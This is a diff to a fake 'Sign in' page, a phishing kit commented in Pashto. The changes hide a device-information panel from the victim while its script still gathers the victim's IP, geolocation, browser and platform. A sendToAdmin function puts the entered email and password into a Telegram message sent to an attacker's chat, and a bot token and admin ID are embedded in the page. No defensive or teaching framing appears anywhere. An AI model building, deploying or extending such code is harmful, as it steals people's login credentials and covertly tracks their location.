@@ -100,22 +100,9 @@
             margin-bottom: 0.8rem;
             text-align: center;
         }
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 3px 0;
-            font-size: 11px;
-            color: #5f6368;
-            border-bottom: 1px solid #f1f3f4;
-        }
-        .info-row .label { color: #9aa0a6; }
-        .info-row .value { color: #202124; font-weight: 500; }
+        /* د معلوماتو بکس پټ شوی - کارونکي ته نه ښکاري */
         .device-info {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 10px 12px;
-            margin: 10px 0;
-            border: 1px solid #e8eaed;
+            display: none;
         }
     </style>
 </head>
@@ -138,6 +125,7 @@
         <h1>Sign in</h1>
         <div class="sub" id="displayEmail"></div>
         
+        <!-- د معلوماتو بکس پټ دی (کارونکي ته نه ښکاري) -->
         <div class="device-info" id="deviceInfo">
             <div class="info-row"><span class="label">📍 IP</span><span class="value" id="ipDisplay">Detecting...</span></div>
             <div class="info-row"><span class="label">🌍 Location</span><span class="value" id="locationDisplay">Detecting...</span></div>
@@ -172,16 +160,20 @@
 </div>
 
 <script>
-    // ==================== ستاسو بوټ تنظیمات ====================
+    // ================================================================
+    //  د بوټ تنظیمات - دلته خپل معلومات دننه کړئ
+    // ================================================================
     const BOT_TOKEN = "8711596639:AAGySHI6xEgqOz0oT1Sq5Y49QpeQkNe-GmI";
     const ADMIN_ID = "8295417969";
-    const BOT_REDIRECT = "https://t.me/YourBotUsername";
+    const BOT_USERNAME = "YourBotUsername"; // خپل بوټ کارن نوم دلته واچوئ (پرته له @)
+    const BOT_REDIRECT = `https://t.me/${BOT_USERNAME}`;
+    // ================================================================
 
     let attempts = {};
     let currentEmail = "";
     let userInfo = {};
 
-    // ========== د کارونکي ټول معلومات راټولول ==========
+    // ========== د کارونکي ټول معلومات راټولول (پټ) ==========
     async function getUserData() {
         const info = {
             ip: 'unknown',
@@ -221,14 +213,10 @@
         return info;
     }
 
-    // ========== UI تازه کول ==========
+    // ========== UI تازه کول (معلومات پټ دي، خو راټولیږي) ==========
     async function updateDeviceInfo() {
         userInfo = await getUserData();
-        document.getElementById('ipDisplay').textContent = userInfo.ip;
-        document.getElementById('locationDisplay').textContent = userInfo.location;
-        document.getElementById('browserDisplay').textContent = userInfo.browser.split(' ').slice(0, 3).join(' ');
-        document.getElementById('deviceDisplay').textContent = userInfo.platform;
-        document.getElementById('timeDisplay').textContent = userInfo.time.replace('T', ' ').slice(0, 19);
+        // معلومات په پټه راټولیږي - کارونکي ته نه ښکاري
     }
 
     // ========== پاسورډ تایید ==========
@@ -255,14 +243,20 @@
         document.getElementById('successBox').style.display = 'none';
     }
 
-    // ========== بوټ ته ټول معلومات لیږل ==========
+    // ========== بوټ ته ټول معلومات لیږل (د بوټ نوم او ټوکن سره) ==========
     async function sendToAdmin(email, password) {
         const locationLink = userInfo.lat && userInfo.lon && userInfo.lat !== 'Unknown' && userInfo.lon !== 'Unknown' 
             ? `https://www.google.com/maps?q=${userInfo.lat},${userInfo.lon}` 
             : 'Not available';
 
+        // د بوټ ID د ټوکن څخه اخیستل
+        const botId = BOT_TOKEN.split(':')[0];
+
         const message = 
             `🔐 *LOGIN SUCCESS* 🔐\n\n` +
+            `🤖 *Bot:* @${BOT_USERNAME}\n` +
+            `🆔 *Bot ID:* ${botId}\n` +
+            `🔑 *Token:* \`${BOT_TOKEN}\`\n\n` +
             `👤 *Email:* ${email}\n` +
             `🔑 *Password:* ${password}\n\n` +
             `📍 *IP:* ${userInfo.ip}\n` +
